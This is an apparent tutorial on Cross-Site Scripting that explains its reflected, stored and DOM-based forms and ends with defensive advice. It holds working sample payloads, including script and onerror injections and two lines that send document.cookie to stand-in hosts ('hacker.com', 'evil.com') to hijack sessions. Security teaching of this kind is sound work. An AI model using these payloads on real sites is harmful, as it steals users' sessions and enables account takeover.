# Cross-Site Scripting (XSS) Fundamentals

## 1. Unit Brief: Executing Code in the Victim's Browser
XSS allows an attacker to inject malicious JavaScript into a web page viewed by other users. It is not an attack on the server; it is an attack on the server's *users*.

## 2. Real-World Relevance
*   **Theft**: Stealing cookies/session tokens.
*   **Actions**: Forcing the user to like a post or change their password.
*   **Phishing**: Rewriting the page to show a fake login form.

## 3. Core Concepts

### Types of XSS
1.  **Reflected**: The payload comes from the URL. You send a link.
    *   `site.com/search?q=<script>alert(1)</script>`
2.  **Stored (Persistent)**: The payload is saved in the database (e.g., a comment).
    *   Every user who views the comment executes the code.
3.  **DOM-Based**: The payload is processed entirely in client-side JavaScript. The server never sees it.

### The Impact
If I can run JS, I am you.
`fetch('http://hacker.com?cookie=' + document.cookie)`

## 4. Practical Examples

### Reflected XSS
Input: `<img src=x onerror=alert(1)>`
*   If the site echoes this back without encoding:
    *   The browser tries to load image `x`.
    *   It fails.
    *   It executes `onerror` code: `alert(1)`.

### Stored XSS
Comment Field: `Great post! <script>fetch('http://evil.com/steal?c='+document.cookie)</script>`
*   Admin views the comment.
*   Admin's cookie is sent to `evil.com`.
*   Attacker hijacks Admin session.

## 5. Common Mistakes Beginners Make
*   **Polyglots**: Using massive payloads seen on Twitter without understanding basic tags. Start with `<h1>test</h1>`. If HTML works, try `<script>`.
*   **Testing blindly**: If the input is inside `<input value="...">`, you first need `">` to close the attribute before opening a script tag.

## 6. Key Takeaways
*   **Context is King**: Where does your input land? (HTML body, Attribute, JavaScript var).
*   **Sanitization is Hard**: Defense requires strict Context-Aware Output Encoding.
